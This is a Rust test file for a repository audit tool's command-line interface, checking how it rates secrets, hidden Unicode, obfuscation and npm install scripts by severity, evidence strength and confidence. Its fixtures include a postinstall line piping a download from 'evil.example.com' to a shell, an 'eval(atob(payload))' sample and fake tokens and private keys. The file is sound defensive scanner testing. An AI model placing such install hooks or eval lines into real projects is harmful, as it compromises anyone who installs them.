//! Audit rule families through the real CLI. Each finding keeps three
//! separate things: severity (how bad it would be if true), evidence
//! strength (what the rule actually saw) and confidence (how often such a
//! finding is real):
//!
//! - a key's folder explains it but does not excuse it: a key under a test
//!   folder that the project's own code reads keeps its confidence, one only
//!   tests use is low, and a key in docs is lowered one step, not dismissed;
//! - published example tokens, filler such as `1a2b3c…` and keys a comment
//!   calls throwaway are weak evidence, while a random-looking key is not;
//! - invisible characters inside a string literal are weak, in a name they
//!   are not;
//! - only decoding that feeds a call which runs code is strong obfuscation,
//!   and hex escapes in a generated bundle are weak;
//! - an npm `prepare` script and a platform-binary download are weak, a
//!   download piped to a shell is strong and names where it comes from;
//! - a clean result lists the checks that ran instead of calling the
//!   repository safe.
//!
//! Every case comes with a contrasting one. Fake keys are built by
//! concatenation so that they never appear whole in the source.

use std::fs;
use std::path::Path;
use std::process::Command;

use serde_json::Value;

fn write(dir: &Path, files: &[(&str, &str)]) {
    for (path, content) in files {
        let path = dir.join(path);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(&path, content).unwrap();
    }
}

fn run(dir: &Path, args: &[&str]) -> String {
    let output = Command::new(env!("CARGO_BIN_EXE_codedna"))
        .args(args)
        .arg("--no-cache")
        .arg(dir)
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let out = String::from_utf8(output.stdout)
        .unwrap()
        .replace("\\\\", "/");
    if out.starts_with(['{', '[']) {
        out
    } else {
        out.replace(".\\", "./").replace('\\', "/")
    }
}

fn audit(files: &[(&str, &str)]) -> Value {
    let dir = tempfile::tempdir().unwrap();
    write(dir.path(), files);
    serde_json::from_str(&run(dir.path(), &["audit", "--json"])).unwrap()
}

/// The only finding of `check` in `file`.
fn finding<'a>(report: &'a Value, check: &str, file: &str) -> &'a Value {
    let found: Vec<&Value> = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|f| f["check"] == check && f["file"].as_str().unwrap().ends_with(file))
        .collect();
    assert_eq!(found.len(), 1, "{check} in {file}: {report:#}");
    found[0]
}

fn confidence(f: &Value) -> &str {
    f["confidence"].as_str().unwrap()
}

fn strength(f: &Value) -> &str {
    f["evidence"]["strength"].as_str().unwrap()
}

fn signals(f: &Value) -> String {
    f["evidence"]["signals"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s.as_str().unwrap())
        .collect::<Vec<_>>()
        .join(" | ")
}

/// A GitHub token whose body looks random.
fn token() -> String {
    format!("{}{}", "ghp_", "R8vKq2Lm9TzX4wPj7NcY1bHs6DfGa3Ue5Qo0")
}

/// A PEM private key with a body.
fn pem() -> String {
    format!(
        "{}RSA {}\n{}\n{}\n-----END RSA PRIVATE KEY-----\n",
        "-----BEGIN ",
        "PRIVATE KEY-----",
        "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gunVTLw",
        "7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkP"
    )
}

#[test]
fn a_key_under_a_test_folder_that_product_code_reads_keeps_its_confidence() {
    let key = pem();
    let read = audit(&[
        ("src/test/resources/server.pem", &key),
        (
            "src/main/java/app/Signer.java",
            "class Signer { String path = \"src/test/resources/server.pem\"; }\n",
        ),
    ]);
    let f = finding(&read, "secret", "src/test/resources/server.pem");
    assert_eq!(confidence(f), "high", "{f:#}");
    assert_eq!(f["context"], "test");
    assert!(signals(f).contains("Signer.java"), "{f:#}");

    let tests_only = audit(&[
        ("src/test/resources/server.pem", &key),
        (
            "src/test/java/app/SignerTest.java",
            "class SignerTest { String path = \"src/test/resources/server.pem\"; }\n",
        ),
    ]);
    let f = finding(&tests_only, "secret", "src/test/resources/server.pem");
    assert_eq!(confidence(f), "low", "{f:#}");
    assert_eq!(strength(f), "weak");
}

#[test]
fn a_key_module_imported_only_by_tests_is_weak_and_one_imported_by_product_code_is_not() {
    let key = format!("export const key = \"{}\";\n", token());
    let mock = audit(&[
        ("src/mock.ts", &key),
        (
            "src/client.test.ts",
            "import { key } from './mock';\ntest('x', () => key);\n",
        ),
        ("src/index.ts", "export const ready = true;\n"),
    ]);
    let f = finding(&mock, "secret", "src/mock.ts");
    assert_eq!(confidence(f), "low", "{f:#}");
    assert_eq!(strength(f), "weak");
    assert!(signals(f).contains("client.test.ts"), "{f:#}");

    let real = audit(&[
        ("src/keys.ts", &key),
        (
            "src/server.ts",
            "import { key } from './keys';\nexport const auth = key;\n",
        ),
    ]);
    let f = finding(&real, "secret", "src/keys.ts");
    assert_eq!(f["severity"], "high");
    assert_eq!(confidence(f), "high", "{f:#}");
    assert_eq!(strength(f), "strong");
}

#[test]
fn published_examples_and_filler_tokens_are_weak_and_random_ones_are_not() {
    let filler = format!("{}{}", "ghp_", "1A2b3C4D5e6F7g8H9i0J0k1L2m3N4o5P6q7R");
    let documented = format!("{}{}", "ghp_", "16C7e42F292c6912E7710c838347Ae178B4a");
    let report = audit(&[
        ("src/filler.ts", &format!("const t = \"{filler}\";\n")),
        (
            "src/documented.ts",
            &format!("const t = \"{documented}\";\n"),
        ),
        ("src/real.ts", &format!("const t = \"{}\";\n", token())),
    ]);
    for file in ["src/filler.ts", "src/documented.ts"] {
        let f = finding(&report, "secret", file);
        assert_eq!(confidence(f), "low", "{f:#}");
        assert_eq!(strength(f), "weak");
    }
    let f = finding(&report, "secret", "src/real.ts");
    assert_eq!(confidence(f), "high", "{f:#}");
    assert_eq!(strength(f), "strong");
}

#[test]
fn a_key_a_comment_calls_throwaway_is_weak() {
    let report = audit(&[
        (
            "src/local.ts",
            &format!(
                "// Throwaway token used only when testing locally.\nconst t = \"{}\";\n",
                token()
            ),
        ),
        (
            "src/remote.ts",
            &format!(
                "// GitHub token for the release bot.\nconst t = \"{}\";\n",
                token()
            ),
        ),
    ]);
    let f = finding(&report, "secret", "src/local.ts");
    assert_eq!(confidence(f), "low", "{f:#}");
    assert_eq!(strength(f), "weak");
    let f = finding(&report, "secret", "src/remote.ts");
    assert_eq!(confidence(f), "high", "{f:#}");
}

#[test]
fn a_key_in_docs_is_lowered_one_step_not_dismissed() {
    let report = audit(&[
        (
            "docs/setup.md",
            &format!("Set `GITHUB_TOKEN={}` before running.\n", token()),
        ),
        ("tests/fixtures/token.txt", &format!("{}\n", token())),
    ]);
    let f = finding(&report, "secret", "docs/setup.md");
    assert_eq!(f["severity"], "medium");
    assert_eq!(confidence(f), "medium", "{f:#}");
    let f = finding(&report, "secret", "tests/fixtures/token.txt");
    assert_eq!(confidence(f), "low", "{f:#}");
}

#[test]
fn an_invisible_character_in_a_string_is_weak_and_in_a_name_is_not() {
    let report = audit(&[
        (
            "src/strip.ts",
            "export const strip = (s: string) => s.startsWith(\"\u{FEFF}\") ? s.slice(1) : s;\n",
        ),
        (
            "src/names.ts",
            "export const user\u{200B}Name = 1;\nexport const userName = 2;\n",
        ),
    ]);
    let f = finding(&report, "hidden-unicode", "src/strip.ts");
    assert_eq!(confidence(f), "low", "{f:#}");
    assert_eq!(strength(f), "weak");
    let f = finding(&report, "hidden-unicode", "src/names.ts");
    assert_eq!(f["severity"], "medium");
    assert_eq!(confidence(f), "medium", "{f:#}");
    assert_eq!(strength(f), "moderate");
}

#[test]
fn only_decoding_fed_into_a_code_runner_is_strong_obfuscation() {
    let report = audit(&[
        (
            "src/parse.ts",
            "export const m = /^data:([^;]+);base64,(.+)$/i.exec(encoded);\n",
        ),
        ("src/run.js", "eval(atob(payload));\n"),
    ]);
    let f = finding(&report, "obfuscation", "src/parse.ts");
    assert_ne!(f["severity"], "high", "{f:#}");
    assert_eq!(confidence(f), "low");
    assert_eq!(strength(f), "weak");
    let f = finding(&report, "obfuscation", "src/run.js");
    assert_eq!(f["severity"], "high");
    assert_eq!(strength(f), "strong");
}

#[test]
fn hex_escapes_in_a_generated_bundle_are_weak() {
    let escapes = "\\x41".repeat(50);
    let bundle = format!("var a=[{}];\nconst s = \"{escapes}\";\n", "1,".repeat(3000));
    let report = audit(&[
        ("src/notify.mjs", &bundle),
        ("src/hidden.js", &format!("const s = \"{escapes}\";\n")),
    ]);
    let f = finding(&report, "obfuscation", "src/notify.mjs");
    assert_eq!(confidence(f), "low", "{f:#}");
    assert_eq!(strength(f), "weak");
    let f = finding(&report, "obfuscation", "src/hidden.js");
    assert_eq!(confidence(f), "medium", "{f:#}");
    assert_eq!(strength(f), "moderate");
}

#[test]
fn install_scripts_report_what_runs_and_where_downloads_come_from() {
    let prepare = audit(&[(
        "package.json",
        r#"{"name":"app","version":"1.0.0","scripts":{"prepare":"node -e \"require('husky').install()\""}}"#,
    )]);
    let f = finding(&prepare, "install-script", "package.json");
    assert_eq!(confidence(f), "low", "{f:#}");
    assert_eq!(strength(f), "weak");

    let piped = audit(&[(
        "package.json",
        r#"{"name":"lib","version":"1.0.0","scripts":{"postinstall":"curl -s https://evil.example.com/x.sh | sh"}}"#,
    )]);
    let f = finding(&piped, "install-script", "package.json");
    assert_eq!(f["severity"], "high");
    assert_eq!(confidence(f), "high", "{f:#}");
    assert_eq!(strength(f), "strong");
    assert!(signals(f).contains("evil.example.com"), "{f:#}");

    let binary = audit(&[(
        "package.json",
        r#"{"name":"tool","version":"1.0.0","scripts":{"postinstall":"curl -L -o bin.tgz https://github.com/acme/tool/releases/download/v1.0.0/tool-linux-x64.tgz"}}"#,
    )]);
    let f = finding(&binary, "install-script", "package.json");
    assert_eq!(confidence(f), "low", "{f:#}");
    assert!(signals(f).contains("github.com"), "{f:#}");
}

#[test]
fn every_finding_has_evidence_and_the_report_lists_the_checks_that_ran() {
    let report = audit(&[("src/real.ts", &format!("const t = \"{}\";\n", token()))]);
    for f in report["findings"].as_array().unwrap() {
        assert!(
            ["weak", "moderate", "strong"].contains(&strength(f)),
            "{f:#}"
        );
        assert!(f["evidence"]["signals"].is_array());
    }
    let checks = report["checks"].as_array().unwrap();
    let names: Vec<&str> = checks
        .iter()
        .map(|c| c["check"].as_str().unwrap())
        .collect();
    for name in [
        "secret",
        "hidden-unicode",
        "obfuscation",
        "install-script",
        "typosquat",
        "binary",
        "minified",
        "vulnerable-dependency",
    ] {
        assert!(names.contains(&name), "{names:?}");
    }
    let secret = checks.iter().find(|c| c["check"] == "secret").unwrap();
    assert_eq!(secret["ran"], true);
    assert_eq!(secret["findings"], 1);
    let deps = checks
        .iter()
        .find(|c| c["check"] == "vulnerable-dependency")
        .unwrap();
    assert_eq!(deps["ran"], false);
    assert!(deps["note"].as_str().unwrap().contains("--deps"));
}

#[test]
fn a_clean_result_names_the_checks_instead_of_calling_the_repository_safe() {
    let dir = tempfile::tempdir().unwrap();
    write(dir.path(), &[("src/index.ts", "export const ok = 1;\n")]);
    let text = run(dir.path(), &["audit"]);
    assert!(text.contains("No red flags found"), "{text}");
    for check in [
        "secrets",
        "hidden Unicode",
        "obfuscation",
        "install scripts",
        "typosquats",
    ] {
        assert!(text.contains(check), "{check}: {text}");
    }
    assert!(text.contains("Dependencies were not checked"), "{text}");
    assert!(text.contains("not a safety verdict"), "{text}");
    assert!(!text.to_lowercase().contains("is safe"), "{text}");
}
